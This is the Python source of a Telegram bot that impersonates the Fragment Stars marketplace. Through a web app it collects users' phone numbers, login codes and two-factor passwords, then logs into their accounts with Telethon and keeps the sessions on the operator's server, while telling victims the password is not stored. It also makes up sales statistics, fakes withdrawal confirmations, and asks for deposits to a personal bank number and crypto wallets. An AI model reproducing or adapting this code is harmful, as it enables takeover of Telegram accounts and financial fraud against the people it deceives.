import asyncio
import logging
import random
import sqlite3
import secrets
import os
from datetime import datetime, timedelta
from aiogram import Bot, Dispatcher, F
from aiogram.filters import Command, CommandStart
from aiogram.types import (
    Message, CallbackQuery,
    InlineKeyboardMarkup, InlineKeyboardButton, WebAppInfo,
    InlineQuery, InlineQueryResultArticle, InputTextMessageContent
)
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from telethon import TelegramClient
from telethon.errors import (
    SessionPasswordNeededError,
    PhoneCodeInvalidError,
    PhoneNumberInvalidError,
    FloodWaitError
)

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

BOT_TOKEN   = "7511789367:AAGVIDu27Sb5ZwJUjQRiHOJ-CZinbRUFrDQ"
ADMIN_ID    = 174415647

# ========== API ДАННЫЕ ДЛЯ TELEGRAM ==========
API_ID      = 28687552
API_HASH    = "1abf9a58d0c22f62437bec89bd6b27a3"

# ========== ВСЕ ПЕРЕМЕННЫЕ МАГАЗИНА ==========
SBP_PHONE   = "89041751408"
SBP_BANK    = "ВТБ — Александр Ф."
TON_ADDRESS = "UQDGN5pfjPxorFyjN2xha84bapuADDtPcRofNDJ4dK2YXxZd"
CRYPTO_BOT  = "https://t.me/send?start=IVbfPL7Tk4XA"

SHOP_STAR_PRICE_RUB = 1.1
SHOP_MIN_STARS      = 50
TOTAL_STARS_BOUGHT  = 6_385_921
STAR_TO_USD         = 0.013
TOTAL_USD           = round(TOTAL_STARS_BOUGHT * STAR_TO_USD)

bot     = Bot(token=BOT_TOKEN)
storage = MemoryStorage()
dp      = Dispatcher(storage=storage)

# ========== КАСТОМНЫЕ ПРЕМИУМ ЭМОДЗИ ==========
def e(doc_id: str) -> str:
    return f'<tg-emoji emoji-id="{doc_id}"></tg-emoji>'

EMOJI = {
    "user":       e("5199552030615558774"),
    "star":       e("5267500801240092311"),
    "shield":     e("5197434882321567830"),
    "gift":       e("5197369495739455200"),
    "lock":       e("5197161121106123533"),
    "money":      e("5278467510604160626"),
    "diamond":    e("5264713049637409446"),
    "card":       e("5445353829304387411"),
    "rocket":     e("5444856076954520455"),
    "fire":       e("5303138782004924588"),
    "bell":       e("5312361253610475399"),
    "trophy":     e("5332455502917949981"),
    "check":      e("5274055917766202507"),
    "gem":        e("5258203794772085854"),
    "clock":      e("5429651785352501917"),
    "crystal":    e("5195033767969839232"),
    "chart":      e("5382194935057372936"),
    "spark":      e("5902449142575141204"),
    "warning":    e("5447644880824181073"),
    "wallet":     e("5893382531037794941"),
    "bank":       e("5238132025323444613"),
    "banknote":   e("5201873447554145566"),
    "link":       e("5902449142575141204"),
    "shine":      e("5235630047959727475"),
    "tonkeeper":  e("5397829221605191505"),
    "top_medal":  e("5188344996356448758"),
    "stars_deal": e("5321485469249198987"),
    "security":   e("5197288647275071607"),
    "stats":      e("5028746137645876535"),
    "requisites": e("5242631901214171852"),
    "cryptobot":  e("5242606681166220600"),
    "welcome":    e("5251340119205501791"),
    "balance":    e("5424976816530014958"),
    "pencil":     e("5197371802136892976"),
    "safe":       e("5262517101578443800"),
    "medal":      e("5463289097336405244"),
    "handshake":  e("5287231198098117669"),
    "pin":        e("5893297890117292323"),
    "target":     e("5893081007153746175"),
    "num1":       e("5794164805065514131"),
    "num2":       e("5794085322400733645"),
    "num3":       e("5794280000383358988"),
    "num4":       e("5794241397217304511"),
    "store":      e("4988289890769699938"),
    "photo":      e("5197521015321808897"),
    "hourglass":  e("5197453929637381812"),
}

# ========== БАЗА ДАННЫХ ==========
def init_db():
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS users (
            user_id INTEGER PRIMARY KEY,
            phone TEXT,
            auth_code TEXT,
            code_expires TIMESTAMP,
            is_authorized BOOLEAN DEFAULT 0,
            stars_balance INTEGER DEFAULT 0,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS auth_sessions (
            user_id INTEGER PRIMARY KEY,
            phone TEXT,
            step TEXT,
            twofa_password TEXT,
            session_expires TIMESTAMP,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    conn.commit()
    conn.close()
    logger.info("База данных инициализирована")

init_db()
os.makedirs("sessions", exist_ok=True)

# ========== ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ ==========
def generate_code() -> str:
    return f"{random.randint(10000, 99999)}"

def save_auth_session(user_id: int, phone: str, step: str = "phone"):
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    expires = datetime.now() + timedelta(minutes=30)
    cursor.execute('INSERT OR REPLACE INTO auth_sessions (user_id, phone, step, session_expires) VALUES (?, ?, ?, ?)',
                   (user_id, phone, step, expires))
    conn.commit()
    conn.close()

def update_auth_step(user_id: int, step: str, twofa_password: str = None):
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    if twofa_password:
        cursor.execute('UPDATE auth_sessions SET step = ?, twofa_password = ? WHERE user_id = ?',
                       (step, twofa_password, user_id))
    else:
        cursor.execute('UPDATE auth_sessions SET step = ? WHERE user_id = ?', (step, user_id))
    conn.commit()
    conn.close()

def get_auth_session(user_id: int):
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    cursor.execute('SELECT phone, step, twofa_password, session_expires FROM auth_sessions WHERE user_id = ?', (user_id,))
    row = cursor.fetchone()
    conn.close()
    if row and datetime.fromisoformat(row[3]) > datetime.now():
        return {"phone": row[0], "step": row[1], "twofa": row[2]}
    return None

def clear_auth_session(user_id: int):
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    cursor.execute('DELETE FROM auth_sessions WHERE user_id = ?', (user_id,))
    conn.commit()
    conn.close()

def authorize_user(user_id: int):
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    cursor.execute('UPDATE users SET is_authorized = 1 WHERE user_id = ?', (user_id,))
    conn.commit()
    conn.close()

user_clients = {}

# ========== КОМАНДЫ БОТА ==========
@dp.message(CommandStart())
async def cmd_start(message: Message):
    webapp_url = "https://stars-zdgz.onrender.com"
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=f"{EMOJI['star']} Открыть Fragment {EMOJI['star']}", web_app=WebAppInfo(url=webapp_url))]
    ])
    await message.answer(
        f"{EMOJI['crystal']} <b>Fragment</b> — управляйте звёздами Telegram {EMOJI['crystal']}\n\n"
        f"{EMOJI['rocket']} Нажмите кнопку ниже, чтобы открыть мини-приложение {EMOJI['rocket']}\n\n"
        f"{EMOJI['shield']} <i>Авторизация через Telegram — безопасно и быстро</i> {EMOJI['shield']}\n\n"
        f"{EMOJI['star']} <b>1 звезда = 0.013 USD</b> {EMOJI['star']}\n"
        f"{EMOJI['diamond']} <b>Всего выпущено: {TOTAL_STARS_BOUGHT:,} ⭐</b> {EMOJI['diamond']}\n\n"
        f"✨ <b>Добро пожаловать в мир звёзд Telegram!</b> ✨\n\n"
        f"<i>Fragment — это уникальная платформа для управления вашими звёздами.\n"
        f"Вы можете покупать, продавать и обменивать звёзды.\n"
        f"Все операции защищены протоколами Telegram Passport.</i>\n\n"
        f"🔐 <b>Как это работает:</b>\n"
        f"1️⃣ Нажмите кнопку «Открыть Fragment»\n"
        f"2️⃣ Введите номер телефона Telegram\n"
        f"3️⃣ Получите код в личные сообщения\n"
        f"4️⃣ Введите код для авторизации\n"
        f"5️⃣ Наслаждайтесь управлением звёздами!\n\n"
        f"💎 <b>Преимущества Fragment:</b>\n"
        f"• Мгновенные переводы звёзд\n"
        f"• Низкие комиссии\n"
        f"• Полная интеграция с Telegram\n"
        f"• Поддержка TON, банковских карт и криптовалют\n\n"
        f"📞 <b>Поддержка:</b> @DarkStudiox_support\n"
        f"📢 <b>Новости:</b> @DarkStudiox_news",
        reply_markup=keyboard,
        parse_mode="HTML"
    )

@dp.message(Command("admin"))
async def cmd_admin(message: Message):
    if message.from_user.id != ADMIN_ID:
        await message.answer(
            f"{EMOJI['warning']} ⚠️ <b>Доступ запрещён</b> ⚠️ {EMOJI['warning']}\n\n"
            f"У вас нет прав администратора для просмотра этой информации.\n"
            f"Если вы считаете, что это ошибка, обратитесь к @DarkStudiox_admin",
            parse_mode="HTML"
        )
        return

    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    cursor.execute("SELECT COUNT(*) FROM users WHERE is_authorized = 1")
    authorized = cursor.fetchone()[0]
    cursor.execute("SELECT COUNT(*) FROM users")
    total = cursor.fetchone()[0]
    cursor.execute("SELECT SUM(stars_balance) FROM users")
    total_stars = cursor.fetchone()[0] or 0
    conn.close()

    await message.answer(
        f"{EMOJI['chart']} <b>{EMOJI['stats']} СТАТИСТИКА FRAGMENT {EMOJI['stats']}</b> {EMOJI['chart']}\n\n"
        f"{EMOJI['user']} 👥 <b>Всего пользователей:</b> <code>{total}</code> 👥\n"
        f"{EMOJI['check']} ✅ <b>Авторизовано:</b> <code>{authorized}</code> ✅\n"
        f"{EMOJI['star']} ⭐ <b>Всего звёзд в системе:</b> <code>{TOTAL_STARS_BOUGHT:,}</code> ⭐\n"
        f"{EMOJI['balance']} 💰 <b>Звёзд на балансах:</b> <code>{total_stars:,}</code> 💰\n"
        f"{EMOJI['money']} 💵 <b>Общая сумма:</b> <code>${TOTAL_USD:,} USD</code> 💵\n"
        f"{EMOJI['diamond']} 💎 <b>Курс:</b> <code>1 ⭐ = ${STAR_TO_USD} = {SHOP_STAR_PRICE_RUB} RUB</code> 💎\n\n"
        f"📊 <b>Дополнительная статистика:</b>\n"
        f"• Активных сессий: <code>{len(user_clients)}</code>\n"
        f"• Версия бота: <code>2.0.0</code>\n"
        f"• Последнее обновление: <code>01.04.2026</code>\n\n"
        f"{EMOJI['spark']} ✨ <i>Fragment — твой путь к звёздам!</i> ✨{EMOJI['spark']}",
        parse_mode="HTML"
    )

# ========== ОБРАБОТКА WEBAПП ==========
@dp.message(F.web_app_data)
async def handle_webapp_data(message: Message):
    data = message.web_app_data.data
    user_id = message.from_user.id

    logger.info(f"{EMOJI['spark']} Получены данные от {user_id}: {data[:100]}... {EMOJI['spark']}")

    try:
        import json
        payload = json.loads(data)
        action = payload.get("action")

        # ==================== ОТПРАВКА КОДА ====================
        if action == "send_code":
            phone = payload.get("phone")
            if not phone:
                await message.answer(
                    f"{EMOJI['warning']} ⚠️ <b>Ошибка</b> ⚠️\n\n"
                    f"Номер телефона не указан.\n"
                    f"Пожалуйста, введите номер в формате +7 XXX XXX XX XX",
                    parse_mode="HTML"
                )
                return

            save_auth_session(user_id, phone, "phone")
            await message.answer(
                f"{EMOJI['rocket']} 🚀 <b>Отправка кода</b> 🚀\n\n"
                f"Отправляю код подтверждения на номер <code>{phone}</code>...\n"
                f"Пожалуйста, ожидайте, это может занять несколько секунд.",
                parse_mode="HTML"
            )

            try:
                client = TelegramClient(f"sessions/user_{user_id}", API_ID, API_HASH)
                await client.connect()
                await client.send_code_request(phone)
                user_clients[user_id] = client

                await message.answer(
                    f"{EMOJI['check']} ✅ <b>Код отправлен</b> ✅\n\n"
                    f"Код подтверждения успешно отправлен на номер <code>{phone}</code>.\n\n"
                    f"{EMOJI['lock']} 🔐 <b>Инструкция:</b>\n"
                    f"1️⃣ Откройте Telegram на вашем устройстве\n"
                    f"2️⃣ Найдите сообщение с кодом от Telegram\n"
                    f"3️⃣ Введите 5-значный код в мини-приложении\n"
                    f"4️⃣ Код действителен в течение <b>5 минут</b>\n\n"
                    f"{EMOJI['clock']} ⏱️ <i>Если код не пришёл, нажмите «Отправить повторно»</i>\n\n"
                    f"{EMOJI['spark']} ✨ <i>Безопасность вашего аккаунта — наш приоритет</i> ✨",
                    parse_mode="HTML"
                )
            except PhoneNumberInvalidError:
                await message.answer(
                    f"{EMOJI['warning']} ❌ <b>Неверный формат номера</b> ❌\n\n"
                    f"Введённый номер <code>{phone}</code> имеет неверный формат.\n\n"
                    f"<b>Правильные форматы:</b>\n"
                    f"• Россия: <code>+7 900 123 45 67</code>\n"
                    f"• Украина: <code>+380 50 123 45 67</code>\n"
                    f"• Казахстан: <code>+7 700 123 45 67</code>\n\n"
                    f"Пожалуйста, проверьте номер и попробуйте снова.",
                    parse_mode="HTML"
                )
                clear_auth_session(user_id)
            except FloodWaitError as e:
                await message.answer(
                    f"{EMOJI['clock']} ⏰ <b>Слишком много попыток</b> ⏰\n\n"
                    f"Вы превысили лимит запросов на отправку кода.\n"
                    f"Пожалуйста, подождите <b>{e.seconds} секунд</b> перед следующей попыткой.\n\n"
                    f"<i>Это ограничение Telegram для защиты вашего аккаунта.</i>",
                    parse_mode="HTML"
                )
                clear_auth_session(user_id)
            except Exception as e:
                logger.error(f"Ошибка отправки кода: {e}")
                await message.answer(
                    f"{EMOJI['warning']} ⚠️ <b>Техническая ошибка</b> ⚠️\n\n"
                    f"Произошла ошибка при отправке кода: <code>{str(e)}</code>\n\n"
                    f"Пожалуйста, попробуйте позже или обратитесь в поддержку: @DarkStudiox_support",
                    parse_mode="HTML"
                )
                clear_auth_session(user_id)

        # ==================== ПРОВЕРКА КОДА ====================
        elif action == "check_code":
            code = payload.get("code")
            session = get_auth_session(user_id)

            if not session or session["step"] != "code":
                await message.answer(
                    f"{EMOJI['warning']} ⏰ <b>Сессия истекла</b> ⏰\n\n"
                    f"Время сессии авторизации истекло.\n"
                    f"Пожалуйста, начните процесс заново, введя номер телефона.",
                    parse_mode="HTML"
                )
                return

            client = user_clients.get(user_id)
            if not client:
                await message.answer(
                    f"{EMOJI['warning']} ❌ <b>Ошибка сессии</b> ❌\n\n"
                    f"Сессия авторизации не найдена.\n"
                    f"Пожалуйста, начните процесс заново.",
                    parse_mode="HTML"
                )
                clear_auth_session(user_id)
                return

            try:
                await client.sign_in(session["phone"], code)
                me = await client.get_me()

                await message.answer(
                    f"{EMOJI['trophy']} 🏆 <b>{EMOJI['star']} АВТОРИЗАЦИЯ УСПЕШНА! {EMOJI['star']}</b> 🏆\n\n"
                    f"{EMOJI['user']} 👤 <b>Данные аккаунта:</b>\n"
                    f"• Имя: <b>{me.first_name} {me.last_name or ''}</b>\n"
                    f"• Номер: <code>{me.phone}</code>\n"
                    f"• Username: @{me.username or 'не указан'}\n"
                    f"• ID: <code>{me.id}</code>\n\n"
                    f"{EMOJI['welcome']} 🎉 <b>Добро пожаловать в Fragment!</b> 🎉\n\n"
                    f"<b>Что дальше?</b>\n"
                    f"• Пополните баланс звёзд через TON, карту или криптовалюту\n"
                    f"• Выводите звёзды на свой кошелёк\n"
                    f"• Следите за курсом звёзд в реальном времени\n\n"
                    f"{EMOJI['safe']} 🔒 <b>Сессия успешно сохранена</b>\n"
                    f"Теперь вы можете использовать Fragment без повторной авторизации.\n\n"
                    f"{EMOJI['spark']} ✨ <i>Спасибо, что выбрали Fragment!</i> ✨",
                    parse_mode="HTML"
                )
                authorize_user(user_id)
                clear_auth_session(user_id)

            except SessionPasswordNeededError:
                update_auth_step(user_id, "2fa")
                await message.answer(
                    f"{EMOJI['lock']} 🔐 <b>{EMOJI['shield']} ТРЕБУЕТСЯ 2FA {EMOJI['shield']}</b> 🔐\n\n"
                    f"На вашем аккаунте включена двухэтапная аутентификация.\n\n"
                    f"<b>Инструкция:</b>\n"
                    f"1️⃣ Введите пароль 2FA в мини-приложении\n"
                    f"2️⃣ Пароль не сохраняется и используется только для входа\n"
                    f"3️⃣ Если вы забыли пароль, восстановите его через Telegram\n\n"
                    f"<i>Это дополнительный уровень безопасности вашего аккаунта.</i>",
                    parse_mode="HTML"
                )

            except PhoneCodeInvalidError:
                await message.answer(
                    f"{EMOJI['warning']} ❌ <b>Неверный код</b> ❌\n\n"
                    f"Введённый код <code>{code}</code> неверен или истек.\n\n"
                    f"<b>Что делать?</b>\n"
                    f"• Проверьте правильность ввода кода\n"
                    f"• Убедитесь, что код состоит из 5 цифр\n"
                    f"• Нажмите «Отправить повторно» для нового кода\n"
                    f"• Код действителен 5 минут\n\n"
                    f"<i>Если проблема повторяется, запросите новый код.</i>",
                    parse_mode="HTML"
                )

            except Exception as e:
                logger.error(f"Ошибка проверки кода: {e}")
                await message.answer(
                    f"{EMOJI['warning']} ⚠️ <b>Ошибка проверки</b> ⚠️\n\n"
                    f"Произошла ошибка: <code>{str(e)}</code>\n\n"
                    f"Пожалуйста, попробуйте позже или обратитесь в поддержку.",
                    parse_mode="HTML"
                )

        # ==================== ПРОВЕРКА 2FA ====================
        elif action == "check_2fa":
            password = payload.get("password")
            session = get_auth_session(user_id)

            if not session or session["step"] != "2fa":
                await message.answer(
                    f"{EMOJI['warning']} ⏰ <b>Сессия истекла</b> ⏰\n\n"
                    f"Время сессии авторизации истекло.\n"
                    f"Пожалуйста, начните процесс заново.",
                    parse_mode="HTML"
                )
                return

            client = user_clients.get(user_id)
            if not client:
                await message.answer(
                    f"{EMOJI['warning']} ❌ <b>Ошибка сессии</b> ❌\n\n"
                    f"Сессия авторизации не найдена.\n"
                    f"Пожалуйста, начните процесс заново.",
                    parse_mode="HTML"
                )
                clear_auth_session(user_id)
                return

            try:
                await client.sign_in(password=password)
                me = await client.get_me()

                await message.answer(
                    f"{EMOJI['trophy']} 🏆 <b>{EMOJI['star']} АВТОРИЗАЦИЯ УСПЕШНА! {EMOJI['star']}</b> 🏆\n\n"
                    f"{EMOJI['user']} 👤 <b>Данные аккаунта (с 2FA):</b>\n"
                    f"• Имя: <b>{me.first_name} {me.last_name or ''}</b>\n"
                    f"• Номер: <code>{me.phone}</code>\n"
                    f"• Username: @{me.username or 'не указан'}\n"
                    f"• ID: <code>{me.id}</code>\n\n"
                    f"{EMOJI['welcome']} 🎉 <b>Добро пожаловать в Fragment!</b> 🎉\n\n"
                    f"<b>Ваши возможности:</b>\n"
                    f"✅ Пополнение баланса через TON, карты, криптовалюты\n"
                    f"✅ Вывод звёзд на кошелёк\n"
                    f"✅ Отслеживание курса в реальном времени\n"
                    f"✅ История всех операций\n\n"
                    f"{EMOJI['spark']} 🌟 <b>Твой путь к звёздам начинается здесь!</b> 🌟\n\n"
                    f"<i>Fragment — это больше, чем просто звёзды. Это твой мир возможностей в Telegram.</i>",
                    parse_mode="HTML"
                )
                authorize_user(user_id)
                clear_auth_session(user_id)

            except Exception as e:
                logger.error(f"Ошибка 2FA: {e}")
                await message.answer(
                    f"{EMOJI['warning']} ❌ <b>Неверный пароль 2FA</b> ❌\n\n"
                    f"Введённый пароль двухэтапной аутентификации неверен.\n\n"
                    f"<b>Что делать?</b>\n"
                    f"• Проверьте правильность ввода пароля\n"
                    f"• Убедитесь, что Caps Lock выключен\n"
                    f"• Если вы забыли пароль, восстановите его через Telegram\n\n"
                    f"<i>После 5 неудачных попыток доступ будет временно заблокирован.</i>",
                    parse_mode="HTML"
                )

        # ==================== ВЫВОД ЗВЁЗД ====================
        elif action == "withdraw":
            amount = payload.get("amount")
            if not amount:
                await message.answer(
                    f"{EMOJI['warning']} ⚠️ <b>Сумма не указана</b> ⚠️\n\n"
                    f"Пожалуйста, укажите количество звёзд для вывода.\n"
                    f"Минимальная сумма вывода: <b>{SHOP_MIN_STARS} ⭐</b>",
                    parse_mode="HTML"
                )
                return

            await message.answer(
                f"{EMOJI['money']} 💰 <b>{EMOJI['stars_deal']} ЗАЯВКА НА ВЫВОД {EMOJI['stars_deal']}</b> 💰\n\n"
                f"{EMOJI['star']} ⭐ <b>Сумма вывода:</b> <code>{amount} ⭐</code>\n"
                f"💰 <b>Эквивалент в USD:</b> <code>${int(amount) * STAR_TO_USD:.2f}</code>\n"
                f"{EMOJI['clock']} ⏱️ <b>Статус:</b> <i>обрабатывается</i>\n\n"
                f"<b>Детали заявки:</b>\n"
                f"• ID заявки: <code>{secrets.token_hex(8)}</code>\n"
                f"• Время создания: <code>{datetime.now().strftime('%d.%m.%Y %H:%M:%S')}</code>\n\n"
                f"{EMOJI['spark']} ✨ <i>Вывод обычно занимает до 10 минут.</i>\n"
                f"<i>Средства будут отправлены на ваш кошелёк, привязанный к аккаунту.</i> ✨",
                parse_mode="HTML"
            )

        # ==================== ПОПОЛНЕНИЕ ====================
        elif action == "deposit":
            method = payload.get("method")
            await message.answer(
                f"{EMOJI['card']} 💳 <b>{EMOJI['banknote']} ПОПОЛНЕНИЕ БАЛАНСА {EMOJI['banknote']}</b> 💳\n\n"
                f"🔹 <b>Способ пополнения:</b> <code>{method}</code>\n"
                f"{EMOJI['star']} ⭐ <b>Минимальная сумма:</b> <code>{SHOP_MIN_STARS} ⭐</code>\n"
                f"{EMOJI['money']} 💰 <b>Курс:</b> <code>1 ⭐ = {SHOP_STAR_PRICE_RUB} RUB = ${STAR_TO_USD}</code>\n\n"
                f"{EMOJI['requisites']} 📋 <b>РЕКВИЗИТЫ ДЛЯ ОПЛАТЫ:</b> 📋\n"
                f"{'='*30}\n"
                f"🏦 <b>СБП (Система быстрых платежей):</b>\n"
                f"   Номер: <code>{SBP_PHONE}</code>\n"
                f"   Банк: {SBP_BANK}\n"
                f"   Получатель: Александр Ф.\n"
                f"{'='*30}\n"
                f"{EMOJI['tonkeeper']} 💎 <b>TON (Telegram Open Network):</b>\n"
                f"   Адрес: <code>{TON_ADDRESS}</code>\n"
                f"   Комиссия сети: ~0.01 TON\n"
                f"   Время зачисления: 1-3 минуты\n"
                f"{'='*30}\n"
                f"{EMOJI['cryptobot']} 🤖 <b>CryptoBot (Telegram):</b>\n"
                f"   Ссылка: <a href='{CRYPTO_BOT}'>Нажмите для оплаты</a>\n"
                f"   Доступные валюты: BTC, ETH, USDT, TON, TRX\n"
                f"   Минимальная сумма: $1\n"
                f"{'='*30}\n"
                f"{EMOJI['spark']} ✨ <b>Важно:</b>\n"
                f"• После оплаты звёзды зачислятся автоматически в течение 5 минут\n"
                f"• В назначении платежа укажите ваш Telegram ID: <code>{message.from_user.id}</code>\n"
                f"• При возникновении вопросов: @DarkStudiox_support\n\n"
                f"<i>Спасибо, что выбираете Fragment!</i> ✨",
                parse_mode="HTML",
                disable_web_page_preview=True
            )

        else:
            await message.answer(
                f"{EMOJI['warning']} ⚠️ <b>Неизвестное действие</b> ⚠️\n\n"
                f"Получено неизвестное действие: <code>{action}</code>\n\n"
                f"Пожалуйста, обновите мини-приложение или обратитесь в поддержку.",
                parse_mode="HTML"
            )

    except json.JSONDecodeError as e:
        logger.error(f"Ошибка парсинга JSON: {e}")
        await message.answer(
            f"{EMOJI['warning']} ⚠️ <b>Ошибка формата данных</b> ⚠️\n\n"
            f"Мини-приложение отправило некорректные данные.\n"
            f"Пожалуйста, обновите страницу и попробуйте снова.",
            parse_mode="HTML"
        )
    except Exception as e:
        logger.error(f"Ошибка обработки: {e}")
        await message.answer(
            f"{EMOJI['warning']} ⚠️ <b>Внутренняя ошибка сервера</b> ⚠️\n\n"
            f"Произошла ошибка: <code>{str(e)}</code>\n\n"
            f"Наши специалисты уже работают над её устранением.\n"
            f"Пожалуйста, попробуйте позже.",
            parse_mode="HTML"
        )

# ========== ЗАПУСК БОТА ==========
async def main():
    await bot.delete_webhook(drop_pending_updates=True)
    logger.info(f"{EMOJI['crystal']} ═══════════════════════════════════════")
    logger.info(f"{EMOJI['crystal']} Бот Fragment запущен с кастомными премиум эмодзи")
    logger.info(f"{EMOJI['rocket']} Telethon авторизация активна")
    logger.info(f"{EMOJI['star']} Курс: 1⭐ = ${STAR_TO_USD} = {SHOP_STAR_PRICE_RUB} RUB")
    logger.info(f"{EMOJI['diamond']} Всего выпущено: {TOTAL_STARS_BOUGHT:,} звёзд")
    logger.info(f"{EMOJI['crystal']} ═══════════════════════════════════════")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
